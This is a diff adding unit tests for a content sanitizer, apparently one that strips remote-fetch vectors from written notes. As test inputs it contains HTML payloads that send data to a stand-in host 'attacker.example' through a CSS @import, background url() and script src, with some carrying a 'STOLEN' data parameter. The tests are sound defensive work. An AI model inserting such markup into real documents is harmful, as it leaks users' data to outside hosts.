@@ -207,6 +207,52 @@ describe('write path — CSS url() and legacy background', () => {
   });
 });
 
+describe('write path — <style>/<script> element fetch vectors', () => {
+  it('neutralizes a <style> block that @imports a remote URL', () => {
+    const out = expectSafeWrite(
+      '<style>@import url("https://attacker.example/leak?d=STOLEN");</style>',
+    );
+    expect(out).not.toContain('<style');
+    expect(out).not.toContain('@import');
+    expect(out).toContain('[external content removed:');
+  });
+
+  it('neutralizes a <style> block with a remote background url()', () => {
+    const out = expectSafeWrite(
+      '<style>body{background:url(https://attacker.example/p.png?d=STOLEN)}</style>',
+    );
+    expect(out).not.toContain('<style');
+    expect(out).not.toContain('background');
+  });
+
+  it('neutralizes a protocol-relative remote url() inside <style>', () => {
+    const out = expectSafeWrite(
+      '<style>body{background:url(//attacker.example/p.png)}</style>',
+    );
+    expect(out).not.toContain('<style');
+    expect(out).not.toContain('url(//');
+  });
+
+  it('neutralizes a <script> element pointing at a remote URL', () => {
+    const out = expectSafeWrite(
+      '<script src="https://attacker.example/x.js"></script>',
+    );
+    expect(out).not.toContain('<script');
+    expect(out).toContain('[external content removed:');
+  });
+
+  it('neutralizes an unterminated remote <style> block', () => {
+    const out = expectSafeWrite('<style>@import url(https://attacker.example/leak)');
+    expect(out).not.toContain('<style');
+  });
+
+  it('leaves a local-only <style> block untouched', () => {
+    const input =
+      '<style>.callout { color: red; background: url(assets/bg.png); }</style>';
+    expect(expectSafeWrite(input)).toBe(input);
+  });
+});
+
 describe('write path — Obsidian %%comments%%', () => {
   it('strips a block comment the owner would never see', () => {
     const out = expectSafeWrite(
